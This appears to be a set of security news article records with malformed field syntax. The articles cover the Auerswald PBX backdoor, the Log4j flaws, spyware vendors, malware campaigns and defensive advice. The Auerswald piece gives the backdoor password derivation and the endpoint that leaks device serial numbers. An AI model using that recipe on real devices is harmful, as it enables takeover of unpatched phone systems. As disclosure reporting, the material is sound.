are on the rise and are fast becoming a cause of concern for businesses. Insider threats can include employees, vendors, contractors, business partners, or an external intruder trying to impersonate an employee. A recent survey revealed that insider threats are responsible for 60% of data breaches.\nIn addition, you can never be fully aware of where these attacks can originate from, and traditional security solutions are largely ineffective when it comes to these threats. This makes them much harder to detect and contain than external threats.\nTruth: Therefore, cyberattacks can very well start from someone you know. \nUse a combination of behavioral analytics and privilege and access management to minimize insider threats. Additionally, conduct security awareness training sessions to educate employees about the dangers of insider threats and how to detect them.\nMyth #3 — Cybercriminals only attack large businesses\nSmall and medium-sized businesses may often be under the false impression that their data isn’t valuable to hackers. However, small and medium-sized businesses are one of the top targets for hackers.\nA recent study revealed that hackers targeted small businesses nearly half of the time. But only 14% of these businesses were prepared to defend themselves in such a situation.\nTruth: No business - no matter how large or small, is ever immune to hacking attempts and malicious attacks.\nHackers don’t discriminate when it comes to their victims. So, don’t let the size of your business, determine how valuable your data is or how secure your assets are.\nMyth #4 — Anti-Virus or Anti-Malware Software is enough to secure my business\nThe anti-virus software is an essential part of your cybersecurity plan. However, it only secures one entry point into your system. Hackers have many ways to bypass anti-virus software and infiltrate networks with attacks such as targeted phishing attacks, and ransomware.\nSo, even with anti-malware software in place, hackers will have plenty of room to launch an attack. \nTruth: Anti-virus software can only protect you from a unique set of recognized cyber threats, not from other emerging cyber threats.\nAs a business, you need to do much more to secure your data from hackers. Deploy an all-encompassing security solution like a Web Application Firewall that monitors threats continuously and provides end-to-end, 24*7 protection from cyber risks.\nMyth #5 — Cybersecurity is too expensive\nEven as malicious cyberattacks continue to make headlines and cost businesses millions, companies still wonder if cybersecurity investments are worth it. Data security is frequently overlooked and is only an afterthought for many enterprises. The average cost of a data breach in 2021 is $4.24 million, the highest in the last 17 years. And this figure does not include the damage that comes with the crippling reputational losses and customer losses from a breach. \nTruth: The cost of a good cybersecurity solution is nothing compared to the cost of a successful attack.\nInvest in a modern security solution like Indusface AppTrana, for example, that can protect you from the latest threats. Moreover, there are many precautionary measures that you can take with absolutely no additional cost to your business, such as strong passwords, multi-factor authentication, access management, and employee training.\nMyth #6 — You don’t require cybersecurity because you’ve never been attacked\nIf you’ve never experienced a cyberattack or data breach yourself, the chances are that you don’t know just how much damage they can cause. You may also assume that your current security posture is strong enough to keep the bad actors away since you’ve never been attacked.\nHowever, cyber threats and hacking tools are continuously evolving to become more and more sophisticated and undetectable each day. And any sensitive data is a potential target for a breach.\nTruth: You could easily be the next target. \nDevelop a sound security strategy that helps you identify existing weaknesses and mitigate attack attempts before any significant damage is caused.\nMyth #7 — You’ve achieved total cybersecurity\nCybersecurity is a continuous process that needs to be upgraded with the changes in the threat landscape. Therefore, never stop working on securing your IT assets. Your organization will always be susceptible to existing and emerging threats. \nTruth: There is no such thing as total or perfect cybersecurity against cyberattacks.\nReview your security policies periodically, conduct security audits, monitor your critical assets continuously, and invest in the upcoming updates in security measures. \nConclusion\nMyths and negative ideas around cybersecurity pose a real threat to organizations that are exposed to various cyber threats each day. Misinformation can open even more opportunities for hackers to infiltrate your network. Stay informed on the latest security best practices to ensure the safety of your business and customers.\n\n\nFound this article interesting?

{'title': 'Secret Backdoors Found in German-made Auerswald VoIP System',
'text': 'Multiple backdoors have been discovered during a penetration test in the firmware of a widely used voice over Internet Protocol (VoIP) appliance from Auerswald, a German telecommunications hardware manufacturer, that could be abused to gain full administrative access to the devices.\n“Two backdoor passwords were found in the firmware of the COMpact 5500R PBX,“ researchers from RedTeam Pentesting said in a technical analysis published Monday. “One backdoor password is for the secret user ’Schandelah’, the other can be used for the highest-privileged user ’admin.’ No way was discovered to disable these backdoors.“\n\nThe vulnerability has been assigned the identifier CVE-2021-40859 and carries a critical severity rating of 9.8. Following responsible disclosure on September 10, Auerswald addressed the problem in a firmware update (version 8.2B) released in November 2021. “Firmware Update 8.2B contains important security updates that you should definitely apply, even if you don’t need the advanced features,“ the company said in a post without directly referencing the issue.\nPBX, short for private branch exchange, is a switching system that serves a private organization. It’s used to establish and control telephone calls between telecommunication endpoints, including customary telephone sets, destinations on the public switched telephone network (PSTN), and devices or services on VoIP networks.\nRedTeam Pentesting said it uncovered the backdoor after it began to take a closer look into a service Auerswald provides in the event a customer were to lose access to their administrator account, in which case the password associated with the privileged account can be reset by reaching out to the manufacturer.\n\nSpecifically, the researchers found that the devices are configured to check for a hard-coded username “Schandelah“ besides “sub-admin,“ the account that’s necessary to manage the device according to the official documentation. “It turns out that Schandelah is the name of a tiny village in northern Germany where Auerswald produces their devices,“ the researchers said.\nFollow-on investigation by the German pen-testing firm revealed that “the corresponding password for this username is derived by concatenating the PBX’s serial number, the string ’r2d2,’ and the current date [in the format ’DD.MM.YYYY’], hashing it with the MD5 hash algorithm and taking the first seven lower-case hex chars of the result.“\n\nPut simply, all an attacker needs to generate the password for the username “Schandelah“ is to obtain the serial number of the PBX — a piece of information that can be trivially retrieved using an unauthenticated endpoint (“https://192.168.1[.]2/about_state“), enabling the bad actor to gain access to a web interface that allows for resetting the administrator password.\n\nOn top of that, the researchers said they identified a second backdoor when the administrative username “admin“ is passed, for which a fallback password is programmatically derived using the aforementioned algorithm, only difference being that a two-letter country code is suffixed to the concatenated string prior to creating the MD5 hash. The alternative password, as in the previous case, provides full-privileged access to the PBX without having to change the password in the first place.\n“Using the backdoor, attackers are granted access to the PBX with the highest privileges, enabling them to completely compromise the device,“ the researchers said. “The backdoor passwords are not documented. They secretly coexist with a documented password recovery function supported by the vendor.“\n\n\nFound this article interesting?

'text': 'Facebook’s parent company Meta Platforms on Monday said it has filed a federal lawsuit in the U.S. state of California against bad actors who operated more than 39,000 phishing websites that impersonated its digital properties to mislead unsuspecting users into divulging their login credentials.\nThe social engineering scheme involved the creation of rogue webpages that masqueraded as the login pages of Facebook, Messenger, Instagram, and WhatsApp, on which victims were prompted to enter their usernames and passwords that were then harvested by the defendants. The tech giant is also seeking $500,000 from the anonymous actors.\n\nThe attacks were carried out using a relay service, Ngrok, that redirected internet traffic to the phishing websites in a manner that concealed the true location of the fraudulent infrastructure. Meta said the volume of these phishing attacks ramped up in volume since March 2021 and that it worked with the relay service to suspend thousands of URLs to the phishing websites.\n\n“This lawsuit is one more step in our ongoing efforts to protect people’s safety and privacy, send a clear message to those trying to abuse our platform, and increase accountability of those who abuse technology,“ Jessica Romero, Meta’s director of platform enforcement and litigation, said in a statement.\n\nThe litigation comes days after the social technology company announced it took steps to disrupt the activities of seven surveillance-for-hire outfits that created over 1,500 fake accounts on Facebook and Instagram to target 50,000 users located in over 100 countries. Last month, Meta said it had banned four malicious cyber groups for targeting journalists, humanitarian organizations, and anti-regime military forces in Afghanistan and Syria.\n\n\nFound this article interesting?

{'title': 'New Mobile Network Vulnerabilities Affect All Cellular Generations Since 2G',
'text': 'Researchers have disclosed security vulnerabilities in handover, a fundamental mechanism that undergirds modern cellular networks, which could be exploited by adversaries to launch denial-of-service (DoS) and man-in-the-middle (MitM) attacks using low-cost equipment.\nThe “vulnerabilities in the handover procedure are not limited to one handover case only but they impact all different handover cases and scenarios that are based on unverified measurement reports and signal strength thresholds,“ researchers Evangelos Bitsikas and Christina Pöpper from the New York University Abu Dhabi said in a new paper. “The problem affects all generations since 2G (GSM), remaining unsolved so far.“\nHandover, also known as handoff, is a process in telecommunications in which a phone call or a data session is transferred from one cell site (aka base station) to another cell tower without losing connectivity during the transmission. This method is crucial to establishing cellular communications, especially in scenarios when the user is on the move.\nThe routine typically works as follows: the user equipment (UE) sends signal strength measurements to the network to determine if a handover is necessary and, if so, facilitates the switch when a more suitable target station is discovered.\n\nWhile these signal readings are cryptographically protected, the content of these reports is not verified by the network, thus allowing an attacker to force the device to move to a cell site operated by the attacker. The crux of the attack lies in the fact that the source base station is incapable of handling incorrect values in the measurement report, raising the possibility of a malicious handover without being detected.\n\nThe new fake base station attacks, in a nutshell, render vulnerable the handover procedures, which are based on the aforementioned encrypted measurement reports and signal power thresholds, effectively enabling the adversary to establish a MitM relay and even eavesdrop, drop, modify, and forward messages transmitted between the device and the network.\n“If an attacker manipulates the content of the [measurement report] by including his/her measurements, then the network will process the bogus measurements,“ the researchers said. “This is possible by imitating a legitimate base station and replaying its broadcast messages.“\n“Attracting“ the device to a fake base station\nThe starting point of the attack is an initial reconnaissance phase wherein the threat actor utilizes a smartphone to collect data pertaining to nearby legitimate stations and then uses this information to configure a rogue base station that impersonates a genuine cell station.\n\nThe attack subsequently involves forcing a victim’s device to connect to the false station by broadcasting master information block (MIB) and system information block (SIB) messages — information necessary to help the phone connect to the network — with a higher signal strength than the emulated base station.\nIn tricking the UEs to connect to the imposter station and forcing the devices to report bogus measurements to the network, the goal is to trigger a handover event and exploit security flaws in the process to result in DoS, MitM attacks, and information disclosure affecting the user as well as the operator. This not only compromises users’ privacy but also puts service availability at risk.\n“When the UE is in the coverage area of the attacker, the rogue base station has high enough signal power to ’attract’ the UE and trigger a [measurement report], then the attacker has very good chances of forcing the victim UE to attach to his/her rogue base station [by] abusing the handover procedure,“ the researchers explained. \n“Once, the UE is attached to the attacker it could either enter in a camped mode due to a denial-of-service (DoS) attack and become unresponsive, or the attacker could establish a man-in-the-middle (MitM) relay building the basis for other advanced exploits.“\n\nAs many as six security vulnerabilities (identified from A to F in the image above) have been identified in the handover process —\nInsecure broadcast messages (MIB, SIB)Unverified measurement reportsMissing cross-validation in the preparation phaseRandom-access channel (RACH) initiation without verificationMissing recovery mechanism, andDifficulty of distinguishing network failures from attacks\nIn an experimental setup, the researchers found all the test devices, including OnePlus 6, Apple iPhone 5, Samsung S10 5G, and Huawei Pro P40 5G, to be susceptible to DoS and MitM attacks. The findings were presented at the Annual Computer Security Applications Conference (ACSAC) held earlier this month.\n\n\nFound this article interesting?

{'title': 'CISA Compliance for 2022',
'text': 'The last several years have seen an ever-increasing number of cyber-attacks, and while the frequency of such attacks has increased, so too has the resulting damage. One needs only to look at CISA’s list of significant cyber incidents to appreciate the magnitude of the problem. In May of 2021, for example, a ransomware attack brought down the Colonial Pipeline, causing a serious fuel disruption for much of the United States.\nJust last month, a hacking group gained access to call logs and text messages from telecommunications carriers all over the world. These are just two of dozens of cyber-attacks occurring this year.\nBecause of these and other cyber security incidents, the Department of Homeland Security issues a compulsory directive to federal agencies to better protect federal information systems and the data that they contain against cyber-attack. This directive is based around CISA’s catalog of vulnerabilities that are known to pose a significant risk. The directive requires covered entities to update their cyber security procedures and to address known vulnerabilities within a specific amount of time.\nEnd of year preparations for CISA\nThe fact that the Federal Government is suddenly placing such a high priority on cyber security is telling, and the directive is worth paying attention to, even for private sector organizations. If federal agencies shore up their cyber defenses in accordance with the new directive, then at least some cybercriminals will likely turn their attention toward attacking private sector targets. After all, it is likely that some of the known vulnerabilities will continue to exist in private companies, even after those vulnerabilities have been addressed on systems belonging to the federal government.\nWith the end of the year rapidly approaching, IT professionals should put cyber security at the top of their New Year’s resolutions. But what specifically should IT pros be doing to prepare for 2022?\nCISA differentiates between known vulnerabilities and vulnerabilities that are known to have been exploited. Likewise, IT pros in the private sector should focus their efforts and their security resources on addressing vulnerabilities that have been exploited in the real world. Such exploits are well documented and pose a major threat to organizations who fail to address such vulnerabilities.\nDeploy patches immediately \nThe single most important thing that organizations can do to ensure that they address known security vulnerabilities is to apply security patches as they become available. Many security patches are specifically designed to address known vulnerabilities, some of which have already been exploited. For example, the Microsoft Exchange Server update addressed the ProxyShell vulnerability earlier this year. ProxyShell was the name given to a serious Exchange Server vulnerability that allowed for remote code execution. Once the vulnerability became public, attackers began actively searching for unpatched Exchange Servers, often installing ransomware onto the servers that were located. \nDon’t forget that holidays can increase your organization’s risk of cyber-attack, so although a patch may come through at an inopportune moment, it’s important to push through immediately as hackers are waiting for lapses in your security network this time of year. \nAs important as patch management may be, installing the available security patches is only one example of the types of things that IT pros need to be doing in order to address known security vulnerabilities.\nPrevent breached passwords in your network\nAnother countermeasure that is nearly as important but widely overlooked is that of preventing users from using passwords that are known to have been compromised.\nHackers maintain massive dark web databases of passwords that have been cracked as a part of various exploits. The reason why this is such a problem is because users very often use their work passwords on various websites to minimize the number of passwords that they must remember. If a password has been cracked, then it means that there is a table matching that password to its hash. This makes it possible for an attacker to recognize when that password has been used elsewhere. This is why it’s so important to prevent users from using any password that is known to be compromised.\nSpecops Password Policy includes a breach password feature that queries databases containing billions of compromised passwords to make sure that those passwords are not being used on your network.\nAdditionally, Specops Password Policy includes features that are designed to help IT pros to create compliant password policies. The software includes built-in templates that allow you to create password policies that are based on the standards set forth by NIST, SANS, and others. Using these templates makes it easy to ensure that the passwords used throughout your organization adhere to the same NIST standards that the federal government is adhering to. You can try the software in your AD organization free for 14 days. \n\n\nFound this article interesting? Follow THN on Facebook, Twitter  and LinkedIn to read more exclusive content we post.',

{'title': 'Experts Discover Backdoor Deployed on the U.S. Federal Agency’s Network',
'text': 'A U.S. federal government commission associated with international rights has been targeted by a backdoor that reportedly compromised its internal network in what the researchers described as a “classic APT-type operation.“ \n“This attack could have given total visibility of the network and complete control of a system and thus could be used as the first step in a multi-stage attack to penetrate this, or other networks more deeply,“ Czech security company Avast said in a report published last week.\n\nThe name of the federal entity was not disclosed, but reports from Ars Technica and The Record tied it to the U.S. Commission on International Religious Freedom (USCIRF). Avast said it was making its findings public after unsuccessful attempts to directly notify the agency about the intrusion and through other channels put in place by the U.S. government.\nAt this stage, only “parts of the attack puzzle“ have been uncovered, leaving the door open for a lot of unknowns with regards to the nature of the initial access vector used to breach the network, the sequence of post-exploitation actions taken by the actor, and the overall impact of the compromise itself.\n\nWhat’s known is that the attack was carried out in two stages to deploy two malicious binaries, the first of which potentially enabled the unidentified adversary to intercept internet traffic and execute code of their choosing, permitting the operators to take complete control over the infected systems. It achieves this by abusing WinDivert, a legitimate packet capturing utility for Windows.\n\nInterestingly, not only both the samples masquerade as an Oracle library named “oci.dll,“ the second-stage decryptor deployed during the attack was found to share similarities with another executable detailed by Trend Micro researchers in 2018, which delved into an information theft-driven supply chain attack dubbed “Operation Red Signature“ aimed at organizations in South Korea. The overlaps have led the Avast Threat Intelligence Team to suspect that the attackers have had access to the source code of the latter.\n“It is reasonable to presume that some form of data gathering and exfiltration of network traffic happened, but that is informed speculation,“ the researchers said. “That said, we have no way to know for sure the size and scope of this attack beyond what we’ve seen.“\n\n\nFound this article interesting?

{'title': 'New Local Attack Vector Expands the Attack Surface of Log4j Vulnerability',
'text': 'Cybersecurity researchers have discovered an entirely new attack vector that enables adversaries to exploit the Log4Shell vulnerability on servers locally by using a JavaScript WebSocket connection.\n“This newly-discovered attack vector means that anyone with a vulnerable Log4j version on their machine or local private network can browse a website and potentially trigger the vulnerability,“ Matthew Warner, CTO of Blumira, said. “At this point, there is no proof of active exploitation. This vector significantly expands the attack surface and can impact services even running as localhost which were not exposed to any network.“\nWebSockets allow for two-way communications between a web browser (or other client application) and a server, unlike HTTP, which is unidirectional where the client sends the request and the server sends the response.\nWhile the issue can be resolved by updating all local development and internet-facing environments to Log4j 2.16.0, Apache on Friday rolled out version 2.17.0, which remediates a denial-of-service (DoS) vulnerability tracked as CVE-2021-45105 (CVSS score: 7.5), making it the third Log 4j2 flaw to come to light after CVE-2021-45046 and CVE-2021-44228.\n\nThe complete list of flaws discovered to date in the logging framework after the original Log4Shell remote code execution bug was disclosed is as follows —\nCVE-2021-44228 (CVSS score: 10.0) - A remote code execution vulnerability affecting Log4j versions from 2.0-beta9 to 2.14.1 (Fixed in version 2.15.0) CVE-2021-45046 (CVSS score: 9.0) - An information leak and remote code execution vulnerability affecting Log4j versions from 2.0-beta9 to 2.15.0, excluding 2.12.2 (Fixed in version 2.16.0)CVE-2021-45105 (CVSS score: 7.5) - A denial-of-service vulnerability affecting Log4j versions from 2.0-beta9 to 2.16.0 (Fixed in version 2.17.0)CVE-2021-4104 (CVSS score: 8.1) - An untrusted deserialization flaw affecting Log4j version 1.2 (No fix available; Upgrade to version 2.17.0)\n“We shouldn’t be surprised that additional vulnerabilities were discovered in Log4j given the additional specific focus on the library,“ Jake Williams, CTO and co-founder of incident response firm BreachQuest, said. “Similar to Log4j, this summer the original PrintNightmare vulnerability disclosure led to the discovery of multiple additional distinct vulnerabilities. The discovery of additional vulnerabilities in Log4j shouldn’t cause concern about the security of log4j itself. If anything, Log4j is more secure because of the additional attention paid by researchers.“\nThe latest development comes as a number of threat actors have piled on the Log4j flaws to mount a variety of attacks, including ransomware infections involving the Russia-based Conti group and a new ransomware strain named Khonsari. What’s more, the Log4j remote code execution flaw has also opened the door to a third ransomware family known as TellYouThePass that’s being used in attacks against Windows and Linux devices, according to researchers from Sangfor and Curated Intel.\nBitdefender Honeypots Signal Active Log4Shell 0-Day Attacks Underway\nThe easily exploited, ubiquitous vulnerability, aside from spawning as many as 60 variations, has presented a perfect window of opportunity for adversaries, with Romanian cybersecurity firm Bitdefender noting that more than 50% of the attacks are leveraging the Tor anonymity service to mask their true origins.\n\n“In other words, threat actors exploiting Log4j are routing their attacks through machines that are closer to their intended targets and just because we don’t see countries commonly associated with cybersecurity threats at the top of the list does not mean that attacks did not originate there,“ Martin Zugec, technical solutions director at Bitdefender, said.\n\nAccording to telemetry data collected between December 11 and December 15, Germany and the U.S. alone accounted for 60% of all the exploitation attempts. The most common attack targets during the observation period were the U.S., Canada, the U.K., Romania, Germany, Australia, France, the Netherlands, Brazil, and Italy.\nGoogle: Over 35,000 Java Packages Affected by the Log4j Flaw\nThe development also coincides with an analysis from Google’s Open Source Insights Team, which found that roughly 35,863 Java packages — accounting for over 8% of the Maven Central repository — use vulnerable versions of the Apache Log4j library. Of the affected artifacts, only around 7,000 packages have a direct dependency on Log4j.\n\n“User’s lack of visibility into their dependencies and transitive dependencies has made patching difficult; it has also made it difficult to determine the full blast radius of this vulnerability,“ Google’s James Wetter and Nicky Ringland said. But on the positive side of things, 2,620 of the impacted packages have already been fixed less than a week after disclosure.\n“There will likely be some time before we understand the full fallout of the log4j vulnerability, but only because it’s embedded in so much software,“ Williams said. “This has nothing to do with threat actor malware. It has to do with the difficulty in finding the myriad places the library is embedded. The vulnerability itself will provide initial access for threat actors who will later perform privilege escalation and lateral movement – that’s where the real risk is.“\n\n\nFound this article interesting?

{'title': 'Apache Issues 3rd Patch to Fix New High-Severity Log4j Vulnerability',
'text': 'The issues with Log4j continued to stack up as the Apache Software Foundation (ASF) on Friday rolled out yet another patch — version 2.17.0 — for the widely used logging library that could be exploited by malicious actors to stage a denial-of-service (DoS) attack.\nTracked as CVE-2021-45105 (CVSS score: 7.5), the new vulnerability affects all versions of the tool from 2.0-beta9 to 2.16.0, which the open-source nonprofit shipped earlier this week to remediate a second flaw that could result in remote code execution (CVE-2021-45046), which, in turn, stemmed from an “incomplete“ fix for CVE-2021-44228, otherwise called the Log4Shell vulnerability.\n\n“Apache Log4j2 versions 2.0-alpha1 through 2.16.0 did not protect from uncontrolled recursion from self-referential lookups,“ the ASF explained in a revised advisory. “When the logging configuration uses a non-default Pattern Layout with a Context Lookup (for example, $${ctx:loginId}), attackers with control over Thread Context Map (MDC) input data can craft malicious input data that contains a recursive lookup, resulting in a StackOverflowError that will terminate the process.“\nHideki Okamoto of Akamai Technologies and an anonymous vulnerability researcher have been credited with reporting the flaw. Log4j versions 1.x, however, are not affected by CVE-2021-45105.\nIt’s worth pointing out that the severity score of CVE-2021-45046, originally classified as a DoS bug, has since been revised from 3.7 to 9.0, to reflect the fact that an attacker could abuse the vulnerability to send a specially crafted string that leads to “information leak and remote code execution in some environments and local code execution in all environments,“ corroborating a previous report from security researchers at Praetorian.\nThe project maintainers also noted that Log4j versions 1.x have reached end of life and are no longer supported, and that security flaws uncovered in the utility after August 2015 will not be fixed, urging users to upgrade to Log4j 2 to get the latest fixes.\nThe fixes are the latest in what’s a highly dynamic situation as the U.S. Cybersecurity and Infrastructure Security Agency (CISA) issued an emergency directive mandating federal civilian departments and agencies to immediately patch their internet-facing systems for the Apache Log4j vulnerabilities by December 23, 2021, citing that the weaknesses pose an “unacceptable risk.“\n\nThe development also comes as the Log4j flaws have emerged as a lucrative attack vector and a focal point for exploitation by multiple threat actors, including nation-backed hackers from the likes of China, Iran, North Korea, and Turkey as well as the Conti ransomware gang, to carry out an array of follow-on malicious activities. This marks the first time the vulnerability has come under the radar of a sophisticated crimeware cartel.\n“The current exploitation led to multiple use cases through which the Conti group tested the possibilities of utilizing the Log4j 2 exploit,“ AdvIntel researchers said. “the criminals pursued targeting specific vulnerable Log4j 2 VMware vCenter [servers] for lateral movement directly from the compromised network resulting in vCenter access affecting U.S. and European victim networks from the pre-existent Cobalt Strike sessions.“\nAmong the others to leverage the bug are cryptocurrency miners, botnets, remote access trojans, initial access brokers, and a new ransomware strain called Khonsari.

{'title': 'Facebook Bans 7 ’Cyber Mercenary’ Companies for Spying on 50,000 Users',
'text': 'Meta Platforms on Thursday revealed it took steps to deplatform seven cyber mercenaries that it said carried out “indiscriminate“ targeting of journalists, dissidents, critics of authoritarian regimes, families of opposition, and human rights activists located in over 100 countries, amid mounting scrutiny of surveillance technologies.\nTo that end, the company said it alerted 50,000 users of Facebook and Instagram that their accounts were spied on by the companies, who offer a variety of services that run the spyware gamut from hacking tools for infiltrating mobile phones to creating fake social media accounts to monitor targets. It also removed 1,500 Facebook and Instagram accounts linked to these firms.\n“The global surveillance-for-hire industry targets people across the internet to collect intelligence, manipulate them into revealing information and compromise their devices and accounts,“ Meta’s David Agranovich and Mike Dvilyanski said. “These companies are part of a sprawling industry that provides intrusive software tools and surveillance services indiscriminately to any customer.“\n\nFour of the cyber mercenary enterprises — Cobwebs Technologies, Cognyte, Black Cube, and Bluehawk CI — are based in Israel. Also included in the list is an Indian company known as BellTroX, a North Macedonian named Cytrox, and an unknown entity operating out of China that’s believed to have conducted surveillance campaigns focused on minority groups in the Asia-Pacific region.\nThe social media giant said it observed these commercial players engaging in reconnaissance, engagement, and exploitation activities to further their surveillance objectives. The companies operated a vast network of tools and fictitious personas to profile their targets, establish contact using social engineering tactics and, ultimately, deliver malicious software through phishing campaigns and other techniques that allowed them to access or take control of the devices.\nCitizen Lab, in an independent report, disclosed that two Egyptians living in exile had their iPhones compromised in June 2021 using a new spyware called Predator built by Cytrox. In both instances, the hacks were facilitated by sending single-click links to the targets via WhatsApp, with the links sent as images containing URLs.\n\nWhile the iOS variant of Predator works by running a malicious shortcut automation retrieved from a remote server, the Android samples unearthed by Citizen Lab features capabilities to record audio conversations and fetch additional payloads from a remote attacker-controlled domain. The Apple devices were running iOS 14.6, the then-latest version of the mobile operating system at the time of the hacks, suggesting the weaponization of a never-before-seen exploit to target the iPhones. It’s not immediately clear if the company has already fixed the vulnerability.\n“The targeting of a single individual with both Pegasus and Predator underscores that the practice of hacking civil society transcends any specific mercenary spyware company,“ Citizen Lab researchers said. “Instead, it is a pattern that we expect will persist as long as autocratic governments are able to obtain sophisticated hacking technology. Absent international and domestic regulations and safeguards, journalists, human rights defenders, and opposition groups will continue to be hacked into the foreseeable future.“\nIn a related development, the U.S. Treasury Department added eight more Chinese companies — drone maker DJI Technology, Megvii, and Yitu Limited, among others — to an investment blocklist for “actively cooperating with the [Chinese] government’s efforts to repress members of ethnic and religious minority groups,“ including Muslim minorities in the Xinjiang province.\nMeta’s sweeping crackdown also comes close on the heels of a detailed technical analysis of FORCEDENTRY, the now-patched zero-click iMessage exploit put to use by the embattled Israeli company NSO Group to surveil journalists, activists, and dissidents around the world.\n\nGoogle Project Zero (GPZ) researchers Ian Beer and Samuel Groß called it “one of the most technically sophisticated exploits“ that uses a number of clever tactics to get around BlastDoor protections added to make such attacks more difficult, and take over the devices to install the Pegasus implant.\nSpecifically, the findings from GPZ point out how FORCEDENTRY leveraged a quirk in iMessage’s handling of GIF images — a vulnerability in the JBIG2 image compression standard that’s used to scan text documents from a multifunction printer — to trick the targets into opening and loading a malicious PDF without requiring any action on their part.\n“NSO is only one piece of a much broader global cyber mercenary industry,“ Agranovich and Dvilyanski added.\nFollowing the revelations, the U.S. government subjected the spyware vendor to economic sanctions, a decision that has since prompted the company to mull a shutdown of its Pegasus unit and a possible sale. “Talks have been held with several investment funds about moves that include a refinancing or outright sale,“ Bloomberg said in a report published last week.\n\n\nFound this article interesting?

{'title': 'New PseudoManuscrypt Malware Infected Over 35,000 Computers in 2021',
'text': 'Industrial and government organizations, including enterprises in the military-industrial complex and research laboratories, are the targets of a new malware botnet dubbed PseudoManyscrypt that has infected roughly 35,000 Windows computers this year alone.\nThe name comes from its similarities to the Manuscrypt malware, which is part of the Lazarus APT group’s attack toolset, Kaspersky researchers said, characterizing the operation as a “mass-scale spyware attack campaign.“ The Russian cybersecurity company said it first detected the series of intrusions in June 2021.\nAt least 7.2% of all computers attacked by the malware are part of industrial control systems (ICS) used by organizations in engineering, building automation, energy, manufacturing, construction, utilities, and water management sectors that are located mainly in India, Vietnam, and Russia. Approximately a third (29.4%) of non-ICS computers are situated in Russia (10.1%), India (10%), and Brazil (9.3%).\n\n“The PseudoManuscrypt loader makes its way onto user systems via a MaaS platform that distributes malware in pirated software installer archives,“ the Kaspersky ICS CERT team said. “One specific case of the PseudoManuscrypt downloader’s distribution is its installation via the Glupteba botnet.“\nCoincidentally, Glupteba’s operations have also taken a significant hit after Google earlier this month disclosed that it acted to dismantle the botnet’s infrastructure and it’s pursuing a litigation against two Russian nationals, who are alleged to have managed the malware along with 15 other unnamed individuals.\n\nAmong the cracked installers that are used to fuel the botnet constitute Windows 10, Microsoft Office, Adobe Acrobat, Garmin, Call of Duty, SolarWinds Engineer’s Toolset, and even Kaspersky’s own antivirus solution. The pirated software installations are driven by a method called search poisoning in which the attackers create malicious websites and use search engine optimization (SEO) tactics to make them show up prominently in search results.\nOnce installed, PseudoManuscrypt comes with an array of intrusive capabilities that allows the attackers to full control of the infected system. This consists of disabling antivirus solutions, stealing VPN connection data, logging keystrokes, recording audio, capturing screenshots and videos of the screen, and intercepting data stored in the clipboard.\n\nKaspersky noted it has identified 100 different versions of the PseudoManuscrypt loader, with the earliest test variants dating back to March 27, 2021. Components of the trojan have been borrowed from commodity malware like Fabookie and a KCP protocol library employed by the China-based APT41 group for sending data back to the attackers’ command-and-control (C2) servers.\nThe malware samples analyzed by the ICS CERT also featured comments written in Chinese and were found specifying Chinese as the preferred language when connecting to the C2 server, but these clues alone have been inconclusive to make an assessment about the malware’s operators or their origins. Also unclear are the ultimate goals of the campaign, raising questions as to whether the attacks are financially motivated or state-backed.\n“The large number of engineering computers attacked, including systems used for 3D and physical modeling, the development and use of digital twins raises the issue of industrial espionage as one of the possible objectives of the campaign,“ the researchers said.\n\n\nFound this article interesting?

{'title': 'How to Prevent Customer Support Help Desk Fraud Using VPN and Other Tools',
'text': 'It’s no secret that the internet isn’t a very safe place. And it’s not hard to understand why. It’s a medium that connects billions of people around the world that affords bad actors enough anonymity to wreak havoc without getting caught. It’s almost as if the internet’s tailor-made to enable scams and fraud.\nAnd that’s just what it does. Right now, the world’s on track to lose $10.5 trillion every year to cybercrime. That number is so large that it’s hard for the average person to grasp. And when most people hear it, they imagine that money’s coming mostly from large-scale data breaches and ransomware attacks on large companies.\nAlthough businesses are among the hardest hit each year, they’re by no means the only target. Every day, internet users are targeted too. They face barrages of phishing emails, compromised websites, and booby-trapped downloads. But among all of the attacks aimed at rank-and-file users, there’s one that stands out – the tech support scam.\nWhat are Tech Support Scams?\nTech support scams happen when people receive a message – either through a popup on their screen or an unsolicited phone call – insisting that something’s wrong with their computer and needs fixing. But what the perpetrator really wants is remote access to the user’s PC. And once they have it, they try and collect personal and financial data to enable further crimes like bank fraud and identity theft. And they’re so common that Microsoft estimates that three in every five internet users get targeted every year.\nBut there are some things that the average internet user can do to protect themselves from tech support scams. They can start by building awareness of how common tech support scams work. Then, they can arm themselves with some digital security tools to minimize the odds of becoming a victim in the first place. Here’s what they can use.\nA Malicious Site / Ad Blocker\nThe first digital tool that internet users can deploy to avoid tech support scams is a malicious site and/or ad blocker. This is effective because many of the fraudulent tech support popups users encounter are the result of visiting compromised websites. Sites are vulnerable when webmasters fail to secure their site installations, which happens more often than you’d think. So, blocking known compromised websites is an excellent and effective way to avoid encountering those popups at all.\nFor those who don’t want to go as far as blocking ads outright, there’s a utility called Spyware Blaster that works quite well on Windows-based PCs. It secures web browsers to prevent a variety of exploits that make fraudulent popups possible and prevents access to a variety of known bad websites. Best of all, it’s free if you don’t mind updating the software manually from time to time (or you can purchase the auto-update feature for a nominal fee).\nBut for complete protection, something like uBlock Origin is a good option. It’s a browser plugin that relies on crowdsourced data to block all kinds of advertising, cookies, and known bad websites. It’s also free for personal use and works on today’s most popular web browsers.\nA Trusted Antivirus/Antimalware Solution\nWhen threats like spyware began to proliferate in the early 2000s, most internet users knew that having an active and updated antivirus/antispyware solution on their device was essential to stay safe. But in recent years, users have gotten less vigilant about playing defense. Back in 2018, antivirus maker Webroot found that almost 50% of Americans had given up on using an antivirus altogether.\nWell, that’s a big mistake. It turns out that the protection that’s built into most modern operating systems doesn’t work nearly as well as third-party solutions. Having an active and updated antivirus/antimalware solution on your PC is still a good idea, and will generally keep it trouble-free and running well. Plus, having a known antivirus on your PC makes it much harder for a scammer to trick you with a popup. After all, you’re not likely to believe a random onscreen message when your known antivirus program says everything’s OK, are you?\nA Secure and Private VPN Service\nLast but not least, internet users should add a secure and private VPN service to their defensive arsenal. A VPN won’t stop you from giving a scammer remote access to your PC (only you can do that), but most VPN services don’t play nice with common remote access software. That alone might buy you enough time to realize that you’re about to be victimized and prevent the scammer from gaining access to your machine.\nAnd as a bonus, many VPN providers offer website filtering, which works just as well as the malicious site and ad blockers mentioned earlier. That makes them excellent at preventing many of the ads and popups that facilitate tech support scams. And, they help to keep your data safe at all times by encrypting your internet traffic as it passes back and forth between your PC and its intended destination – so they’re great at preventing a variety of other data theft attacks, too.\nThe Bottom 